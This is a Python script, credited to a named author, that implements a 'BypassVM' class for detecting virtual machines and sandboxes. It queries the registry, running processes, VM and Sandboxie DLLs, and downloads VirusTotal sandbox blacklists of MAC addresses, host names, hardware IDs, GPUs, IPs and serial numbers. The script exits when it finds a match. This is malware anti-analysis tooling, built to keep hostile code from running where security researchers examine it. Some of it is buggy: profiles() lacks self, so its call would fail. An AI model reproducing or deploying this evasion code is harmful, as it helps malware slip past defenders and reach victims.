# -* kerpy tool by Lawxsz on github and telegram!! -* #

import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket

def get_base_prefix_compat(): # define all of the checks
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix

if in_virtualenv() == True: # if we are in a vm
    sys.exit() # exit
    
class BypassVM:

    def registry_check(self):  
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            sys.exit()

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            sys.exit()
                           
        if os.path.exists(vmware_dll): # Detect vmware dll
            sys.exit()
            
        if os.path.exists(virtualbox_dll): # Detect virtualbox dll
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll") # Detect sandbox dll
            sys.exit()
        except:
            pass              

    def mac_check(self): # Mac detect
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
        
        if mac_address in mac_list:
            sys.exit()
    def check_pc(self): # User/Name Detect
     vmname = os.getlogin()
     
     vm_name = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt").text
     
     if vmname in vm_name:
         sys.exit()
     vmusername = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt").text
    
     host_name = socket.gethostname()
     if host_name in vmusername:
         sys.exit()
            
    def hwid_vm(self): # HWID detect
     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
     hwid_vm = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt").text
     if current_machine_id in hwid_vm:
         sys.exit()
            
    def checkgpu(self): #GPU Detect
     c = wmi.WMI()
     for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
     gpulist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt").text
     if GPUm in gpulist:
         sys.exit()
        
    def check_ip(self): #IP Detect
     ip_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt").text
     reqip = requests.get("https://api.ipify.org/?format=json").json()
     ip = reqip["ip"]
     if ip in ip_list:
         sys.exit()
    def profiles(): # Guids / Bios Detect etc
     machine_guid = uuid.getnode()
     guid_pc = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt").text
     bios_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt").text
     baseboard_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt").text
     serial_disk = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt").text
     if machine_guid in guid_pc:
         sys.exit()
     w = wmi.WMI()
     for bios in w.Win32_BIOS():
      bios_check = bios.SerialNumber    
     if bios_check in bios_guid:
         sys.exit() 
     for baseboard in w.Win32_BaseBoard():
         base_check = baseboard.SerialNumber
     if base_check in baseboard_guid:
         sys.exit()
     for disk in w.Win32_DiskDrive():
      disk_serial = disk.SerialNumber
     if disk_serial in serial_disk:
         sys.exit()

test = BypassVM()
test.registry_check()
test.processes_and_files_check()
test.mac_check()
test.check_pc()
test.checkgpu()
test.hwid_vm()
test.check_ip()
test.profiles()
